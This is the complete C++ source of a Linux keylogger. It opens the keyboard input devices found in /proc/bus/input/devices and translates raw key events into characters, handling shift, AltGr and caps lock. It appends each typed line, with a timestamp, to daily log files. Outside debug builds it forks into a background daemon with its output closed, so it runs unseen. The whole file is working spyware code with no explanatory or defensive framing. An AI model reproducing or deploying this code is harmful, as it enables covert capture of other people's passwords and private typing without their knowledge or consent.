#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <unistd.h>

#include <chrono>
#include <csignal>
#include <cstring>
#include <ctime>
#include <fstream>
#include <map>
#include <regex>
#include <stdexcept>
#include <string>
#include <vector>

#ifdef DEBUG
#define X9KL_DEBUG(...) std::fprintf(stdout, "DEBUG: " __VA_ARGS__)
#define X9KL_ERROR(...) std::fprintf(stderr, "ERROR: " __VA_ARGS__)
#else
#define X9KL_DEBUG(...)
#define X9KL_ERROR(...)
#endif  // DEBUG

struct x9kl_ctx_t {
  bool is_capslock_on;
  bool is_shift_pressed;
  bool is_altgr_pressed;
  uint32_t buffer_cursor;
  std::vector<int> kb_fds;
  std::vector<char> kb_buffer;
  struct input_event event;

  x9kl_ctx_t() : is_capslock_on{false},
                 is_shift_pressed{false},
                 is_altgr_pressed{false},
                 buffer_cursor{0} {
    memset(&event, 0, sizeof(struct input_event));
  }
};

struct key_event_handler_t {
  char key_char;
  char key_char_shift;
  char key_char_altgr;
  void (*cb)(x9kl_ctx_t *);
};

static void handle_key(x9kl_ctx_t *);
static void handle_enter(x9kl_ctx_t *);
static void handle_backspace(x9kl_ctx_t *);
static void handle_capslock(x9kl_ctx_t *);
static void handle_delete(x9kl_ctx_t *);
static void handle_arrow(x9kl_ctx_t *);
static void handle_shift(x9kl_ctx_t *);
static void handle_altgr(x9kl_ctx_t *);

volatile std::sig_atomic_t must_stop{0};

// key mapping
static const std::map<int, key_event_handler_t> handlers{
    {KEY_0, {'0', ')', '}', handle_key}},
    {KEY_1, {'1', '!', '\0', handle_key}},
    {KEY_2, {'2', '@', '\0', handle_key}},
    {KEY_3, {'3', '#', '\0', handle_key}},
    {KEY_4, {'4', '$', '\0', handle_key}},
    {KEY_5, {'5', '%', '\0', handle_key}},
    {KEY_6, {'6', '\0', '\0', handle_key}},  // TODO
    {KEY_7, {'7', '&', '{', handle_key}},
    {KEY_8, {'8', '*', '[', handle_key}},
    {KEY_9, {'9', '(', ']', handle_key}},
    {KEY_A, {'a', 'A', '\0', handle_key}},
    {KEY_B, {'b', 'B', '\0', handle_key}},
    {KEY_C, {'c', 'C', '\0', handle_key}},
    {KEY_D, {'d', 'D', '\0', handle_key}},
    {KEY_E, {'e', 'E', '\0', handle_key}},
    {KEY_F, {'f', 'F', '\0', handle_key}},
    {KEY_G, {'g', 'G', '\0', handle_key}},
    {KEY_H, {'h', 'H', '\0', handle_key}},
    {KEY_I, {'i', 'I', '\0', handle_key}},
    {KEY_J, {'j', 'J', '\0', handle_key}},
    {KEY_K, {'k', 'K', '\0', handle_key}},
    {KEY_L, {'l', 'L', '\0', handle_key}},
    {KEY_M, {'m', 'M', '\0', handle_key}},
    {KEY_N, {'n', 'N', '\0', handle_key}},
    {KEY_O, {'o', 'O', '\0', handle_key}},
    {KEY_P, {'p', 'P', '\0', handle_key}},
    {KEY_Q, {'q', 'Q', '/', handle_key}},
    {KEY_R, {'r', 'R', '\0', handle_key}},
    {KEY_S, {'s', 'S', '\0', handle_key}},
    {KEY_T, {'t', 'T', '\0', handle_key}},
    {KEY_U, {'u', 'U', '\0', handle_key}},
    {KEY_V, {'v', 'V', '\0', handle_key}},
    {KEY_W, {'w', 'W', '?', handle_key}},
    {KEY_X, {'x', 'X', '\0', handle_key}},
    {KEY_Y, {'y', 'Y', '\0', handle_key}},
    {KEY_Z, {'z', 'Z', '\0', handle_key}},
    {KEY_COMMA, {',', '<', '\0', handle_key}},
    {KEY_DOT, {'.', '>', '\0', handle_key}},
    {KEY_MINUS, {'-', '_', '\0', handle_key}},
    {KEY_SEMICOLON, {';', ':', '\0', handle_key}},
    {KEY_EQUAL, {'=', '+', '\0', handle_key}},
    {KEY_SPACE, {' ', '\0', '\0', handle_key}},
    {KEY_ENTER, {'\0', '\0', '\0', handle_enter}},
    {KEY_BACKSPACE, {'\0', '\0', '\0', handle_backspace}},
    {KEY_CAPSLOCK, {'\0', '\0', '\0', handle_capslock}},
    {KEY_DELETE, {'\0', '\0', '\0', handle_delete}},
    {KEY_RIGHT, {'\0', '\0', '\0', handle_arrow}},
    {KEY_LEFT, {'\0', '\0', '\0', handle_arrow}},
    {KEY_LEFTSHIFT, {'\0', '\0', '\0', handle_shift}},
    {KEY_RO, {'/', '?', '\0', handle_key}},
    {KEY_GRAVE, {'\'', '\"', '\0', handle_key}},
    {KEY_102ND, {'\\', '|', '\0', handle_key}},
    {KEY_RIGHTBRACE, {'[', '{', '\0', handle_key}},
    {KEY_RIGHTALT, {'\0', '\0', '\0', handle_altgr}},
    {KEY_BACKSLASH, {']', '}', '\0', handle_key}}};

static void sig_handler(int sig_num) {
  (void)sig_num;

  must_stop = 1;
}

static std::vector<std::string> get_event_files(void) {
  std::vector<std::string> content;

  {
    std::ifstream file{"/proc/bus/input/devices"};
    std::regex kb_regex{"H: Handlers=sysrq kbd (.+?) leds"};
    std::string line;

    while (std::getline(file, line)) {
      std::smatch match;

      if (std::regex_search(line, match, kb_regex)) {
        X9KL_DEBUG("keyboard found, event file: '%s'\n",
                   match[1].str().c_str());
        content.emplace_back(match[1]);
      }
    }
  }

  return content;
}

static std::vector<int> get_keyboard_fds(void) {
  std::vector<int> fds;

  for (auto &event : get_event_files()) {
    int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);

    if (fd > 0) {
      fds.emplace_back(fd);
    }
  }

  return fds;
}

static int initialize_x9kl(x9kl_ctx_t *ctx) {
  X9KL_DEBUG("logs dir: %s\n", LOGS_DIR);

  ctx->kb_fds = get_keyboard_fds();
  if (ctx->kb_fds.empty()) {
    X9KL_ERROR("no keyboards found\n");
    return 1;
  }

  if (mkdir(LOGS_DIR, S_IRWXU | S_IRWXG | S_IRWXO)) {
    if (errno != EEXIST) {
      X9KL_ERROR("fail to create logs dir, error: %s\n", strerror(errno));
      return 1;
    }
  }

  std::signal(SIGINT, sig_handler);
  std::signal(SIGKILL, sig_handler);
  std::signal(SIGTERM, sig_handler);
  std::signal(SIGQUIT, sig_handler);

  return 0;
}

static void destroy_ctx(x9kl_ctx_t *ctx) {
  for (auto &fd : ctx->kb_fds) {
    close(fd);
  }
}

void handle_key(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  char key_code = ctx->event.code, key_char;

  if (ctx->is_shift_pressed) {
    key_char = handlers.at(key_code).key_char_shift;
  } else if (ctx->is_altgr_pressed) {
    key_char = handlers.at(key_code).key_char_altgr;
  } else {
    key_char = handlers.at(key_code).key_char;
  }

  if (ctx->is_capslock_on && (key_char >= 'a' || key_char <= 'z')) {
    key_char -= 32;
  }

  ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor++,
                        key_char);
}

void handle_enter(x9kl_ctx_t *ctx) {
  char date[9]{0}, timestamp[9]{0};

  if (!ctx->event.value || ctx->kb_buffer.empty()) {
    return;
  }

  {
    auto now =
        std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());

    std::strftime(date, sizeof(date), "%d%m%Y", std::localtime(&now));
    std::strftime(timestamp, sizeof(timestamp), "%H:%M:%S",
                  std::localtime(&now));
  }

  std::ofstream log_file{std::string{LOGS_DIR} + "/log_" + date + ".txt",
                         std::ios::app};

  log_file << "[" << timestamp << "] ";
  log_file.write(ctx->kb_buffer.data(), ctx->kb_buffer.size());
  log_file << "\n";

  ctx->kb_buffer.clear();
  ctx->buffer_cursor = 0;
}

void handle_capslock(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  ctx->is_capslock_on = !ctx->is_capslock_on;
}

void handle_shift(x9kl_ctx_t *ctx) {
  ctx->is_shift_pressed = ctx->event.value;
}

void handle_altgr(x9kl_ctx_t *ctx) {
  ctx->is_altgr_pressed = ctx->event.value;
}

void handle_delete(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
  }
}

void handle_backspace(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  if (!ctx->kb_buffer.empty()) {
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + (--ctx->buffer_cursor));
  }
}

void handle_arrow(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  auto current_key = ctx->event.code;

  ctx->buffer_cursor = (current_key == KEY_LEFT) ? (ctx->buffer_cursor - 1)
                                                 : (ctx->buffer_cursor + 1);
}

static void mainloop(x9kl_ctx_t *ctx) {
  struct input_event ev;
  fd_set rfds;

  while (!must_stop) {
    FD_ZERO(&rfds);

    for (auto &fd : ctx->kb_fds) {
      FD_SET(fd, &rfds);
    }

    int ret =
        select(*(ctx->kb_fds.end() - 1) + 1, &rfds, nullptr, nullptr, nullptr);

    if (ret == -1) {
      continue;
    }

    for (auto &fd : ctx->kb_fds) {
      if (FD_ISSET(fd, &rfds)) {
        int n_bytes = read(fd, &ev, sizeof(struct input_event));

        if ((ev.type == EV_KEY) && (n_bytes > 0)) {
          X9KL_DEBUG("event received for key '%d'\n", ev.code);

          try {
            auto ev_handler = handlers.at(ev.code);

            ctx->event = ev;
            ev_handler.cb(ctx);
          } catch (const std::out_of_range &e) {
            X9KL_ERROR("no event handler for key %d\n", ev.code);
          }
        }
      }
    }
  }

  X9KL_DEBUG("finishing mainloop\n");
}

static void run(void) {
  x9kl_ctx_t ctx;

  if (initialize_x9kl(&ctx)) {
    X9KL_ERROR("fail to initialize the context\n");
    std::exit(EXIT_FAILURE);
  }

  mainloop(&ctx);
  destroy_ctx(&ctx);
}

static void run_as_daemon(void) {
  pid_t pid, sid;

  pid = fork();
  if (pid == -1) {
    std::exit(EXIT_FAILURE);
  } else if (pid > 0) {
    std::exit(EXIT_SUCCESS);
  } else {
    umask(0);

    sid = setsid();
    if (sid < 0) {
      std::exit(EXIT_FAILURE);
    }

    chdir("/");

    std::fclose(stdin);
    std::fclose(stdout);
    std::fclose(stderr);

    run();
  }
}

int main(void) {
#ifdef DEBUG
  run();
#else
  run_as_daemon();
#endif  // DEBUG

  std::exit(EXIT_SUCCESS);
}
